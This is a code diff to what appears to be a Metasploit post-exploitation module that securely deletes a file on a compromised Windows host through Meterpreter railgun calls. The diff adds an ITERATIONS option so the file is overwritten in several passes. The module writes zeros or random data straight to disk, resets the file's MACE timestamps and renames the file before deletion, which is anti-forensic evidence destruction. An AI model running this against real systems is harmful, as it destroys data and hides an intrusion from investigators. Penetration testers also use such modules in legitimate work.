@@ -35,6 +35,7 @@ class Metasploit3 < Msf::Post
 		register_options(
 			[
 				OptBool.new('ZERO', [ false, 'Zero overwrite. If set to false, random data will be used', false]),
+				OptInt.new('ITERATIONS', [false, 'The number of overwrite passes', 1 ]),
 				OptString.new('FILE',[true, 'File to be deleted',''])
 			], self.class)
 	end
@@ -42,6 +43,7 @@ class Metasploit3 < Msf::Post
 
 	def run
 		type = 1
+		n = datastore['ITERATIONS']
 		file = datastore['FILE']
 
 		if datastore['ZERO']==true
@@ -53,9 +55,9 @@ class Metasploit3 < Msf::Post
 			print_error("File #{file} does not exist")
 			return
 		elsif comp_encr(file)
-			print_status("File compress or encrypted. Content could not be overwritten")
+			print_status("File compress or encrypted. Content could not be overwritten!")
 		end
-		file_overwrite(file,type)
+		file_overwrite(file,type,n)
 	end
 
 
@@ -76,7 +78,7 @@ class Metasploit3 < Msf::Post
 		print_status("Size of the file: #{size_file}")
 
 		if (size_file<800)
-			print_status("The file is too small. If it's store in the MTF (NTFS) sdel will not overwrite it")
+			print_status("The file is too small. If it's store in the MTF (NTFS) sdel will not overwrite it!")
 		end
 
 		sizeC= size_cluster()
@@ -101,34 +103,41 @@ class Metasploit3 < Msf::Post
 		client.priv.fs.set_file_mace(file, date,date,date,date)
 	end
 
-
 	#Function to overwrite the file
-	def file_overwrite(file,type)
+	def file_overwrite(file,type,n)
 		#FILE_FLAG_WRITE_THROUGH: Write operations will go directly to disk
 		r = client.railgun.kernel32.CreateFileA(file, "GENERIC_WRITE", "FILE_SHARE_READ|FILE_SHARE_WRITE", nil, "OPEN_EXISTING", "FILE_FLAG_WRITE_THROUGH", 0)
 		handle=r['return']
 		real_size=size_on_disk(file)
 
-		#http://msdn.microsoft.com/en-us/library/windows/desktop/aa365541(v=vs.85).aspx
-		client.railgun.kernel32.SetFilePointer(handle,0,nil,"FILE_BEGIN")
-
 		if type==0
 			random="\0"*real_size
-		else
-			random=Rex::Text.rand_text(real_size,nil)
 		end
 
-		#http://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx
-		w=client.railgun.kernel32.WriteFile(handle,random,real_size,4,nil)
+		i=0
+		n.times do
+			i+=1
+			print_status("Iteration #{i.to_s}/#{n.to_s}:")
 
-		if w['return']==false
-			print_error("The was an error writing to disk, check permissions")
-			return
+			if type==1
+				random=Rex::Text.rand_text(real_size,nil)
+			end
+
+			#http://msdn.microsoft.com/en-us/library/windows/desktop/aa365541(v=vs.85).aspx
+			client.railgun.kernel32.SetFilePointer(handle,0,nil,"FILE_BEGIN")
+
+			#http://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx
+			w=client.railgun.kernel32.WriteFile(handle,random,real_size,4,nil)
+
+			if w['return']==false
+				print_error("The was an error writing to disk, check permissions")
+				return
+			end
+
+			print_status("#{w['lpNumberOfBytesWritten']} bytes overwritten")
 		end
 
-		print_status("#{w['lpNumberOfBytesWritten']} bytes overwritten")
 		client.railgun.kernel32.CloseHandle(handle)
-
 		change_mace(file)
 
 		#Generate a long random file name before delete it
